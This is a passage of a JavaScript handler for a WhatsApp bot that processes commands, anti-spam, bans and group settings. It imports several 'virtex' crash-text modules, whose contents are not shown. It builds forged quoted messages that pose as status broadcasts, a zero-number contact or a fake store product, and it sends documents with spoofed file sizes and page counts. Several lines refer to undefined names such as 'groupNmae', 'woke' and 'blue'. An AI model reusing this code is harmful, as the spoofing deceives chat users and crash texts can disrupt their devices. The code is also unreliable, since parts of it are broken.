"use strict";
const toMs = require('ms')
const chalk = require('chalk')
const fs = require("fs")
const fse = require('fs-extra');
const {
    Sticker,
    StickerTypes
} = require('wa-sticker-formatter')
const moment = require("moment-timezone");
const util = require("util");
const {
    exec,
    spawn,
    execSync
} = require("child_process")
const axios = require("axios");
const yts = require("yt-search");
const gtts = require('node-gtts')
const ggs = require('google-it')
const canvacard = require("canvacard");
const speed = require("performance-now");
const ms = require("parse-ms");
const ytdl = require('ytdl-core');
const xyz = require("@xyzteams/scapers")
const os = require('os');
const {
    join,
    dirname
} = require('path');
const path = require('path');
const {
    removeBackgroundFromImageFile
} = require('remove.bg')
const {
    performance
} = require('perf_hooks')
const fetch = require('node-fetch');
const cheerio = require('cheerio')
const request = require("request")
const anonfile = require('anonfile-lib')
const {
    Primbon
} = require('scrape-primbon')

const primbon = new Primbon()
const {
    youtubeSearch,
    pinterest,
    mediafiredl,
    lyricsv2,
    lyrics,
    facebookdl,
    facebookdlv2,
    tiktokdl,
    tiktokdlv2,
    twitterdl,
    twitterdlv2,
    getZodiac,
    liputan6,
    googleIt,
    wallpaperv2,
    chord,
    googleImage,
    jadwalTVNow,
    gempa,
    stickerTelegram,
    stickerLine,
    latinToAksara,
    aksaraToLatin,
    asmaulhusnajson,
    alquran,
    listJadwalSholat,
    gempaNow,
    instagramdl,
    instagramdlv3,
    instagramdlv2,
    instagramStory,
    savefrom,
    snapsave
} = require('@bochilteam/scraper')

//----------------- LIB FILE ------------------\\
const {
    userXp,
    userLeveling,
} = require("../lib/user");
const TicTacToe = require("../lib/tictactoe")
const {
    msgFilter,
    addSpam,
    SpamExpired,
    cekSpam
} = require('../lib/antispam')
const {
    color
} = require('../lib/color')
const {
    doodstream,
    terabox
} = require('../lib/18+')

const photooxy = require('../lib/photooxy');
const {
    toFirstCase,
    isNumber,
    formatp,
    parseMention,
    resize,
    pickRandom,
    getRandom,
    generateProfilePicture,
    getCase,
    addCase,
    delCase,
    listCase,
    runtime,
    FileSize,
    h2k,
    GIFBufferToVideoBuffer,
    makeid,
    kyun,
    randomNomor,
    jsonformat,
    isUrl,
    fetchJson,
    sleep,
    getBuffer,
} = require("../lib/myfunc");
const {
    floNime,
    UploadFileUgu,
    TelegraPh,
    uploadFile
} = require('../lib/uploader')
const {
    toAudio,
    toPTT,
    toVideo,
    ffmpeg
} = require('../lib/convert')
const {
    instagram4,
    capcutdl,
    mediafiredll,
    instagram2,
    instagram3,
    cekkuota,
    tele,
    ytPlayMp4,
    ytPlayMp3,
    igdl,
    kodepos,
    mediafire,
    ffstalk,
    textpro,
    mlstalk,
    Tiktok,
    surah,
    getSurah,
    listsurah,
    tafsirsurah,
    ephoto,
    emoji
} = require('../lib/scraper')
const {
    addblockcmd,
    deleteblockcmd,
    checkblockcmd
} = require("../lib/blockcmd");
const {
    addError,
    clearAllError,
    deleteError,
    checkError
} = require("../lib/totalerror")
const {
    Nothing,
    Failed,
    Succes,
    addAutoClear,
    autoClearChat,
    checkDataName,
    createDataId,
    addDataId,
    removeDataId,
    checkDataId,
    getHit,
    cmdAdd,
    expiredCmd
} = require("../lib/totalcmd");
const _sewa = require('../lib/sewa')
const _prem = require("../lib/premium");
const {
    clearAllBan,
    addBanned,
    unBanned,
    cekBannedUser
} = require("../lib/banned")
const {
    jadibot,
    stopjadibot,
    listjadibot
} = require('../lib/jadibot.js')
const {
    bad
} = require('../message/messages')
const {
    vnToxic,
    vnMenu,
    vnSalam,
    vnBot,
    vnAra,
    vnSpam,
    vnPagi,
    vnSiang,
    vnMalam,
    vnOwner,
    vnKawai,
    vnLove
} = require('../temp/audio/autovn.js')
// VIRTEX BUKAN BUG
const {
    virtex,
    virtag,
    philip,
    emoji1,
    emoji2,
    virtex2,
    virtex3,
    virtex4,
    virtex5,
    virtex8,
    virtex9,
    virtex10,
    virtex11,
    virtex12,
    slayer,
    ngazap,
    virtexbytsukasa
} = require('../database/virtex/virtex.js')
const {
    virtex6
} = require('../database/virtex/virtex6.js')
const {
    virtex7
} = require('../database/virtex/virtex7.js')
//database 
const AntiSpam = db.data.antispam
const DataId = db.data.data
const ban = db.data.banned
const premium = db.data.premium
const listcmdblock = db.data.blockcmd
const listerror = db.data.listerror
const hitnya = db.data.hittoday
const dash = db.data.dashboard
const anonChat = db.data.anonymous
const allcommand = db.data.allcommand
const sewa = db.data.sewa
const spammer = []

const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
let secreto = JSON.parse(fs.readFileSync('./database/secreto_balas.json'))

var publik = global.public
//=================================================//
module.exports = async (conn, dev, chatUpdate, store) => {
    //console.log(chatUpdate.messages)
    var multi = db.data.settings['settingbot'].multi
    const m = dev
    var Ownerin = "2349019529423@s.whatsapp.net"
    var ownerNumber = [`${botNumber}@s.whatsapp.net`, `2347041039367@s.whatsapp.net`, `${conn.user.jid}`]
    const Tnow = (new Date() / 1000).toFixed(0)
    const seli = Tnow - m.messageTimestamp.low
    if (seli > Intervalmsg) return console.log((`Message ${Intervalmsg} seconds ago ignored to avoid spamming`))
    try {

        const {
            type,
            now,
            args,
            sender,
            fromMe,
            from,
            botNumber,
            senderNumber,
            groupName,
            groupId,
            groupMembers,
            groupDesc,
            groupOwner,
            pushname,
            itsMe,
            mentionByTag,
            mentionByReply,
            users,
            budy,
            content,
            body,
        } = dev
        const isGroup = m.key.remoteJid.endsWith('@g.us');
        ///_&-
        if (multi) {
            var prefix = '.'
            var thePrefix = "Multi Prefix"
        }
        const isCmd = body.startsWith(prefix)
        const isCommand = isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ""
        const isCommandx = body.startsWith(prefix) 
    ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() 
    : body.trim().split(/ +/).shift().toLowerCase();
        const q = args.join(' ')
        const timeWib = moment().tz('Africa/Lagos').format('HH:mm:ss')
        const isOwner = ownerNumber.includes(sender) || checkDataId("owner", sender, DataId)
        const text = args.join(' ')
        const command = (_prem || isOwner) ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCommand
        const theOwner = sender == Ownerin
        const timestampp = speed();
        const latensi = speed() - timestampp
        const quoted = dev.quoted ? dev.quoted : dev
        const mime = (quoted.msg || quoted).mimetype || ''
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const numberQuery = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
        const Input = (mentionByTag && mentionByTag[0]) ? mentionByTag[0] :
            (mentionByReply || q ? numberQuery : false);

        //const Input = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
        const replyCommand = isCmd ? isCmd : allcommand.includes(toFirstCase(command))
        const selectedButton = (type == 'buttonsResponseMessage') ? dev.message.buttonsResponseMessage.selectedButtonId : ''
        const isBannedx = sender ? cekBannedUser(senderNumber, ban) : false
        const isMessage =
            m.message.conversation ||
            m.message.extendedTextMessage?.text ||
            m.message.imageMessage?.caption ||
            m.message.imageMessage?.url || // To handle direct image messages without captions
            m.message.videoMessage?.caption ||
            m.message.videoMessage?.url || // To handle direct video messages without captions
            m.message.stickerMessage?.url || // To handle sticker messages
            m.message.documentMessage?.caption ||
            m.message.documentMessage?.url || // To handle documents without captions
            m.message.audioMessage?.url || // To handle audio messages
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.templateButtonReplyMessage?.selectedId ||
            m.message.listResponseMessage?.singleSelectReply?.selectedRowId ||
            m.message.contactMessage?.displayName || // To handle contact messages
            m.message.locationMessage?.degreesLatitude || // To handle location messages
            m.message.pollCreationMessage?.name || // To handle poll messages
            '';
        const user = global.db.data.users[m.sender]
        const chat = isGroup ? global.db.data.chats[m.chat] : false
        const isSimi = isGroup ? siminya.includes(m.chat) : false
        const kickon = global.db.data.kickon[m.chat]
        const botRun = global.db.data.others['runtime']
        const botTime = (new Date - botRun.runtime) || "Not detected"
        const runTime = clockString(botTime)

        const {
            beta1,
            beta2,
            buk1
        } = require("../lib/hdr.js")

        if (global.autoReadChat === true && isMessage) {
            await conn.readMessages([m.key])
        }
        if (global.autotyping === true) {
            conn.sendPresenceUpdate('composing', from)
        }
        if (global.alwaysonline === true) {
            conn.sendPresenceUpdate('available', from);
        }
        //Waktu
        let d = new Date
        let locale = 'id'
        let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
        let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
        let week = d.toLocaleDateString(locale, {
            weekday: 'long'
        })
        const calender = d.toLocaleDateString("id", {
            day: 'numeric',
            month: 'long',
            year: 'numeric'
        })
// Check if the sender is banned and if the message is a command
       function clockString(ms) {
            let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
            let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
            let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
            let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
            var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " hari, ") : "";
            var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " jam, ") : "";
            var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " menit, ") : "";
            var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " detik") : "";
            let time = d > 0 ? dDisplay + hDisplay + mDisplay + sDisplay : hDisplay + mDisplay + sDisplay
            return time
        }
        if (isGroup && chat) {
            if (!('name' in chat)) chat.name = groupNmae
            if (!isNumber(chat.add)) chat.add = 0
            if (!('welcome' in chat)) chat.welcome = false
            if (!('detect' in chat)) chat.detect = true
            if (!('sWelcome' in chat)) chat.sWelcome = ''
            if (!('sBye' in chat)) chat.sBye = ''
            if (!('sPromote' in chat)) chat.sPromote = ''
            if (!('sDemote' in chat)) chat.sDemote = ''
            if (!('desc' in chat)) chat.desc = true
            if (!('descUpdate' in chat)) chat.descUpdate = true
            if (!('stiker' in chat)) chat.stiker = false
            if (!("antibot" in chat)) chat.antibot = false
            if (!('antiimage' in chat)) chat.antiimage = false
            if (!('antisticker' in chat)) chat.antisticker = false
            if (!('antivideo' in chat)) chat.antivideo = false;
            if (!('antiaudio' in chat)) chat.antiaudio = false;
            if (!('antiLink' in chat)) chat.antiLink = false
            if (!isNumber(chat.expired)) chat.expired = 0
            if (!('antiBadword' in chat)) chat.antiBadword = true
            if (!('antispam' in chat)) chat.antispam = true
            if (!('antitroli' in chat)) chat.antitroli = false
            if (!('antivirtex' in chat)) chat.antivirtex = true
            if (!('antiwame' in chat)) chat.antiwame = false
            if (!('antitoxic' in chat)) chat.antitoxic = false
            if (!('viewonce' in chat)) chat.viewonce = true
            if (!('nsfw' in chat)) chat.nsfw = false
            if (!("rpg" in chat)) chat.rpg = false;
            if (!('clear' in chat)) chat.clear = false
            if (!isNumber(chat.cleartime)) chat.clearTime = 0
        } else if (isGroup) global.db.data.chats[m.chat] = {
            name: groupName,
            add: 0,
            welcome: false,
            detect: false,
            sWelcome: '',
            sBye: '',
            sPromote: '',
            sDemote: '',
            desc: true,
            descUpdate: true,
            antibot: false,
            antiimage: false,
            antisticker: false,
            antiaudio: false,
            antivideo: false,
            autostiker: false,
            antilink: false,
            antilinkgc: false,
            antidelete: false,
            antiasing: false,
            banchat: false,
            expired: 0,
            antibadword: false,
            antispam: true,
            antitroli: false,
            antivirtex: false,
            antitoxic: false,
            antipromosi: false,
            antihidetag: false,
            viewonce: false,
            nsfw: false,
            rpg: false,
            clear: false,
            clearTime: 0
        }

        const settings = global.db.data.settings['settingbot']
        if (settings) {

            //Auto set
            if (!isNumber(settings.status)) setting.status = new Date() * 1
            if (!('setmenu' in settings)) settings.setmenu = "document"
            if (!('docType' in settings)) settings.docType = "docx"
            if (!('Qoted' in settings)) settings.Qoted = "ftoko"
            if (!('autoBio' in settings)) settings.autoBio = true
            if (!('multi' in settings)) settings.multi = true
            if (!('prefix' in settings)) settings.prefix = "!"
            if (!('fake' in settings)) settings.fake = botName
            if (!('autoblockcmd' in settings)) settings.autoblockcmd = false
            if (!('fake1' in settings)) settings.fake1 = "EhzStore"
            if (!('replyType' in settings)) settings.replyType = "web"
            if (!('setwelcome' in settings)) settings.setwelcome = "type11"
            if (!('autoReport' in settings)) settings.autoReport = true
            if (!('autoLevel' in settings)) settings.autoLevel = true
            if (!('autoSticker' in settings)) settings.autoSticker = false
            if (!('publik' in settings)) settings.publik = true

        } else {
            global.db.data.settings['settingbot'] = {
                status: new Date() * 1,
                setmenu: "document",
                docType: "docx",
                Qoted: "ftoko",
                autoBio: true,
                multi: true,
                prefix: "!",
                fake: botName,
                autoblockcmd: false,
                replyType: "web",
                setwelcome: "type11",
                autoReport: true,
                autoLevel: true,
                autoSticker: false,
                publik: true
            }
        }
        const {
            downloadContentFromMessage,
            generateWAMessageFromContent,
            proto,
            generateWAMessageContent
        } = require("@whiskeysockets/baileys")
        async function createImage(url) {
            const {
                imageMessage
            } = await generateWAMessageContent({
                image: {
                    url
                }
            }, {
                upload: conn.waUploadToServer
            });
            return imageMessage;
        }

        //Security / Keamanan
        const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const isGroupOwner = isGroup ? groupMetadata.owner : ''
        const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isGroupAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isAntiLink = isGroup ? db.data.chats[from].antilink : false
        const isWelcome = isGroup ? db.data.chats[from].welcome : true
        const isAntidelete = isGroup ? db.data.chats[from].antidelete : false
        const isKickarea = isGroup ? db.data.chats[from].antiasing : false
        const isAntilinkGc = isGroup ? db.data.chats[from].antilinkgc : false
        const isBanchat = isGroup ? db.data.chats[from].banchat : false
        const isAntiVirtex = isGroup ? db.data.chats[from].antivirtex : false
        const isAntiWame = isGroup ? db.data.chats[from].antiwame : false
        const isAntiToxic = isGroup ? db.data.chats[from].antitoxic : false
        const isPremium = isOwner ? true : _prem.checkPremiumUser(sender, premium)
        const gcount = isPremium ? gcounti.prem : gcounti.user
        const isAntiViewOnce = isGroup ? db.data.chats[from].viewonce : false
        const isAntiImage = isGroup ? db.data.chats[from].antiimage : false
        const isAntiVideo = isGroup ? db.data.chats[from].antivideo : false
        const isAntiAudio = isGroup ? db.data.chats[from].antiaudio : false
        const isAntiSticker = isGroup ? db.data.chats[from].antisticker : false
        const isAntiBot = isGroup ? db.data.chats[from].antibot : false
        const isAntiNsfw = isGroup ? db.data.chats[from].nsfw : false
        const isAntiPromosi = isGroup ? db.data.chats[from].antipromosi : false
        const isGame = isGroup ? db.data.chats[from].game : false
        const thumb = fs.readFileSync('./database/blueimages/thumb.jpeg')
        //const isHit = db.data.users[sender].hit > 1? true : false 

        //User 
        const userLevel = user ? db.data.users[m.sender].level : true
        const userExp = user ? db.data.users[m.sender].exp : true
        const userId = user ? db.data.users[m.sender].id : true
        const amountExp = Math.floor(Math.random() * 10) + 50
        const requiredExp = 10000 * userLevel
        const userPersen = userExp / requiredExp * 100
        const userVerified = user ? db.data.users[m.sender].date : true

        //Ucapan Waktu  
        if (timeWib < "23:59:00") {
            var ucapanWaktu = '𝗛𝗢𝗛𝗢❄️'
        }
        if (timeWib < "19:00:00") {
            var ucapanWaktu = '𝗛𝗢𝗛𝗢❄️'
        }
        if (timeWib < "18:00:00") {
            var ucapanWaktu = '𝗛𝗢𝗛𝗢❄️'
        }
        if (timeWib < "15:00:00") {
            var ucapanWaktu = '𝗛𝗢𝗛𝗢❄️'
        }
        if (timeWib < "11:00:00") {
            var ucapanWaktu = '𝗛𝗢𝗛𝗢❄️'
        }
        if (timeWib < "06:00:00") {
            var ucapanWaktu = '𝗛𝗢𝗛𝗢❄️'
        }
        // Presence Online

        // Disable auto-typing updates
        conn.sendPresenceUpdate('unavailable', from);

        let colors = ['red', 'white', 'black', 'blue', 'yellow', 'green', 'magenta', 'cyan', 'pink', 'gold', 'purple', 'navy', 'gray']
        const isImage = (type === 'imageMessage')
        const isVideo = (type === 'videoMessage')
        const isSticker = (type == 'stickerMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'conversation')
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
        const isViewOnce = (type == 'viewOnceMessageV')
        const isAllMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'stickerMessage' || type === 'audioMessage' || type === 'contactMessage' || type === 'locationMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
        const isQuotedText = type === 'extendedTextMessage' && content.includes('conversation')
        const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isHanMedia = m.mtype
        const pesilit = (type === 'conversation' && dev.message.conversation) ? dev.message.conversation : (type == 'imageMessage') && dev.message.imageMessage.caption ? dev.message.imageMessage.caption : (type == 'videoMessage') && dev.message.videoMessage.caption ? dev.message.videoMessage.caption : (type == 'extendedTextMessage') && dev.message.extendedTextMessage.text ? dev.message.extendedTextMessage.text : ''
        const messagesD = pesilit.slice(0).trim().split(/ +/).shift().toLowerCase()
        const messagesC = pesilit.slice(0).trim()
 const logMessage = (type, colorCode, timestamp, content, sender, group = null) => {
    let log = color(`[${type}]`, colorCode) + 
              color(` [${timestamp}]`, "green") + 
              color(` ${content}`, "cyan") + 
              color(` from`, "gold") + 
              color(` ${sender}`, "orange");
    
    if (group) log += color(` in group`, "purple") + color(` ${group}`, "deeppink");
    console.log(log);
};

const timestamp = moment.tz('Africa/Lagos').format('HH:mm');

if (!isGroup && !isCmd) {
    logMessage("PRIVATE", "greenyellow", timestamp, budy, pushname);
}

if (isGroup && !isCmd) {
    logMessage("GROUP", "gold", timestamp, budy, pushname, groupName);
}

if (!isGroup && isCmd) {
    logMessage("CMD", "blue", timestamp, `${command} [${args.length}]`, pushname);
}

if (isGroup && isCmd) {
    logMessage("CMD", "blue", timestamp, `${command} [${args.length}]`, pushname, groupName);
}

        // Pengubah teks
        const Ehztext = (text, style = 1) => {
  var abc = 'abcdefghijklmnopqrstuvwxyz1234567890'.split('');
  var ehz = {
    1: 'ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘǫʀꜱᴛᴜᴠᴡxʏᴢ1234567890'
  };
            var replacer = [];
            abc.map((v, i) =>
                replacer.push({
                    original: v,
                    convert: ehz[style].split('')[i]
                })
            );
            var str = text.toLowerCase().split('');
            var output = [];
            str.map((v) => {
                const find = replacer.find((x) => x.original == v);
                find ? output.push(find.convert) : output.push(v);
            });
            return output.join('');
        };
        //×××××××××××××××××××××××××//
        let listRespon = global.db.data.respon[body]
        if (listRespon) m.reply(listRespon.respon)

        //FAKE REPLY  
        const ments = (teks) => {
            return teks.match('@') ? [...teks.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net') : [sender]
        }

        const fcall = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            'message': {
                extendedTextMessage: {
                    text: body
                }
            }
        }
        const ehan = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                "contactMessage": {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;menhera,;;;\nFN: ehanz Ai\nitem1.TEL;waid=${m.sender.split("@")[0]}:+${m.sender.split("@")[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': null,
                    thumbnail: null,
                    sendEphemeral: true
                }
            }
        }
        const ftoko = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "16505434800@s.whatsapp.net"
                } : {})
            },
            message: {
                "productMessage": {
                    "product": {
                        "productImage": {
                            "mimetype": "image/jpeg",
                            "jpegThumbnail": fs.readFileSync('./database/blueimages/quoted.jpg')
                        },
                        "title": `${pushname}`,
                        "description": `${ucapanWaktu} kak`,
                        "currencyCode": "IDR",
                        "priceAmount1000": `${pushname}`,
                        "retailerId": `Rp10`,
                        "productImageCount": 1
                    },
                    "businessOwnerJid": `0@s.whatsapp.net`
                }
            }
        }
        async function bluedemon(m) {
            try {
                const jsonUrl = `https://huggingface.co/spaces/BLUESERVER/DATABASE/raw/main/DATABASE.json`;
                const response = await axios.get(jsonUrl);
                const allowedNumbers = response.data.authorizedNumbers;

                const userPhone = m.sender;
                const isBuyer = allowedNumbers.includes(userPhone);

                return isBuyer;
            } catch (error) {
                console.error('Error fetching authorized numbers:', error);
                await blue.sendMessage(m.chat, {
                    text: '🚫 Unable to access the server at this time. Please try again later.'
                });
                return false;
            }
        }
        const isBuyer = await bluedemon(m);
        const fkontak = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: `0@s.whatsapp.net`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${pushname}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': fs.readFileSync('./database/blueimages/thumb.jpeg')
                }
            }
        }
        //SetReply
        const setReply = async (teks, member = []) => {
            let photo = pickRandom(fotoRandom)

            let contextInfo = {
                forwardingScore: 99999,
                isForwarded: true,
                mentionedJid: member,
                forwardedNewsletterMessageInfo: {
                    newsletterJid,
                    serverMessageId: 100,
                    newsletterName
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: '🎄𝙼𝙴𝚁𝚁𝚈 𝙲𝙷𝚁𝙸𝚂𝚃𝙼𝙰𝚂🎄',
                    body: `${ucapanWaktu} ${pushname}`,
                    previewType: "PHOTO",
                    thumbnailUrl: photo,
                    sourceUrl: `${web}`
                }
            }

            if (replyType === "web") {
                conn.sendMessage(from, {
                    contextInfo,
                    text: teks
                }, {
                    quoted: fcall
                })
            } else if (replyType === "web2") {
                conn.sendMessage(from, {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            mediaType: 3,
                            renderLargerThumbnail: true,
                            thumbnailUrl: photo,
                            sourceUrl: `https://wa.me/${botNumber}?text=Hello`
                        }
                    },
                    text: teks
                }, {
                    quoted: m
                })
            } else if (replyType === "mess") {
                conn.sendMessage(from, {
                    id: m.key.id,
                    contextInfo: {
                        forwardingScore: 50,
                        isForwarded: true
                    },
                    showAdAttribution: true,
                    text: teks
                }, {
                    quoted: m
                });
            } else if (replyType === "ftoko") {
                conn.sendMessage(from, {
                    text: teks
                }, {
                    quoted: ftoko
                });
            } else if (replyType === "document") {
                conn.sendMessage(m.chat, {
                    document: fs.readFileSync("./package.json"),
                    fileName: '© Blue-demon',
                    mimetype: "application/vnd.ms-excel",
                    fileLength: 999999999,
                    bpageCount: 10903,
                    //jpegThumbnail: fs.readFileSync('./database/blueimages/thumbnaildokumen.jpg'),
                    caption: Ehztext(teks),
                    contextInfo: {
                        mentionedJid: [sender],
                        forwardingScore: 9999999,
                        isForwarded: true,
                        externalAdReply: {
                            showAdAttribution: false,
                            title: botName,
                            body: `${ucapanWaktu} ${pushname}`,
                            thumbnailUrl: photo,
                            mediaType: 1,
                            sourceUrl: `${web}`,
                        }
                    }
                }, {
                    quoted: m,
                    ephemeralExpiration: 86400
                });
            } else {
                conn.sendMessage(from, {
                    text: "Error SetReply Tidak Di Temukan"
                })
            }
        }
        //Message
        require("./message.js")(senderNumber, prefix, command, setReply)
        // Custom reply function
const reply = async (teks) => {
    conn.sendMessage(from, {
        text: `  *🎄𝙼𝙴𝚁𝚁𝚈 𝙲𝙷𝚁𝙸𝚂𝚃𝙼𝙰𝚂🎄*\n\n${teks}`,
        mentions: await ments(teks)
    }, {
        quoted: fcall
    });
};
        const sendvn = (teks) => {
            conn.sendMessage(from, {
                audio: {
                    url: teks
                },
                ptt: true,
                waveform: [0, 0, 50, 0, 0, 0, 10, 80, 10, 60, 10, 99, 60, 30, 10, 0, 0, 0],
                mimetype: 'audio/mpeg'
            }, {
                quoted: m
            })
        }
        const sendSticker = (teks) => {
            conn.sendMessage(from, {
                sticker: {
                    url: teks
                }
            }, {
                quoted: m
            })
        }
        // publik & Self And Banchat
        if (!publik && !isOwner) return; // Ignore non-owner commands in self mode

        const pickRandom = (arr) => {
            return arr[Math.floor(Math.random() * arr.length)]
        }
  const vnme = vnMenu
const dmusic = vnme[Math.floor(Math.random() * vnme.length)]
        const fsimi = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "status@broadcast"
                } : {})
            },
            message: {
                "imageMessage": {
                    "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                    "mimetype": "image/jpeg",
                    "caption": 'simi botz',
                    "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                    "fileLength": "28777",
                    "height": 1080,
                    "width": 1079,
                    "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                    "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                    "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                    "mediaKeyTimestamp": "1610993486",
                    "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                }
            }
        }
        const banData = JSON.parse(fs.readFileSync('./database/banned.json', 'utf-8') || '[]');
    const isBanned = banData.some(ban => ban.number === m.sender && (!ban.groupJid || ban.groupJid === m.chat));

    if (isBanned) {
        // Delete the message if in a group
        if (isGroup && isBotGroupAdmins) {
            await conn.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            });
        }

        // Block further actions for the banned user
        return;
    }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? conn.sendMessage(from, {
                text: teks,
                mentions: memberr,
                contextInfo: {
                    "mentionedJid": memberr
                }
            }): conn.sendMessage(from, {
                mentions: memberr,
                text: teks,
                contextInfo: {
                    "mentionedJid": memberr
                }
            }, {
                quoted: dev
            })
        }
        const math = (teks) => {
            return Math.floor(teks)
        }
        const sendGif = (teks, teksnya) => {
            conn.sendMessage(from, {
                video: teks,
                caption: "Nih!",
                gifPlayback: true
            }, {
                quoted: dev
            })
        };

        //AUTO BLOCK CMD
        for (let i = 0; i < listcmdblock.length; i++) {
            if (command === listcmdblock[i].cmd) {
                if (autoblockcmd) {
                    return setReply(mess.block.Bsystem)
                } else {
                    return setReply(mess.block.Bowner)
                }
            }
        }
        //××××××××××××××××{××××//
        const addSpammer = function(jid, _db) {
            let position = false
            Object.keys(_db).forEach((i) => {
                if (_db[i].id === jid) {
                    position = i
                }
            })
            if (position !== false) {
                _db[position].spam += 1
            } else {
                let bulin = ({
                    id: jid,
                    spam: 1
                })
                _db.push(bulin)
            }
        }

        const FinisHim = async function(jid, _db) {
            let position = false
            Object.keys(_db).forEach((i) => {
                if (_db[i].id === jid) {
                    position = i
                }
            })
            if (position !== false) {
                if (_db[position].spam > 7) {
                    if (db.data.users[sender].banned.status || !isOwner) {
                        return
                    }
                    let obj = {
                        id: senderNumber,
                        status: true,
                        date: calender,
                        reason: "Spam Bot"
                    }
                    db.data.users[woke].banned = obj
                    console.log(`${jid} Terdeteksi spam lebih dari ${_db[position].spam} kali`)
                    setReply("Kamu telah di banned karena telah melakukan spam")
                }
            } else {
                console.log(`Spam ke ${_db[position].spam}`)
            }
        }
        //System Expired
        _sewa.expiredCheck(conn, sewa)
        _prem.expiredCheck(premium)
        //autoClearChat(conn,clearchat)

        //ANTI SPAM BERAKHIR
        if (SpamExpired(senderNumber, "Case", AntiSpam)) {
            let position = false
            for (let i of spammer) {
                if (i.id == senderNumber) {
                    position = i
                }
            }

            if (position !== false) {
                spammer.splice(position, 1)
                console.log(chalk.bgGreen(color("[  Remove ]", "black")), "Sukses remove spammer")
            }
        }


        SpamExpired(senderNumber, "NotCase", AntiSpam)
        if (isBannedx && !isOwner) {
            return
        } //user terbanned
        if (isCmd && cekSpam("Case", senderNumber, AntiSpam)) {
            addSpammer(senderNumber, spammer)
            FinisHim(senderNumber, spammer)
            console.log(chalk.bgYellowBright(color("[  SPAM  ]", "black")), "antispam Case aktif")
            return
        }

        //ANTI SPAM PRIVATE CHAT
        if (antiSpam && isCmd && msgFilter.isFiltered(from) && !isGroup && !itsMe && !isOwner) {
            addSpam("Case", senderNumber, "5s", AntiSpam)
            addSpammer(senderNumber, spammer)
            return setReply("`YOO,STOP SPAMMING CMD`")
        }

        //ANTI SPAM GROUP CHAT     
        if (antiSpam && isCmd && msgFilter.isFiltered(from) && isGroup && !itsMe && !isOwner) {
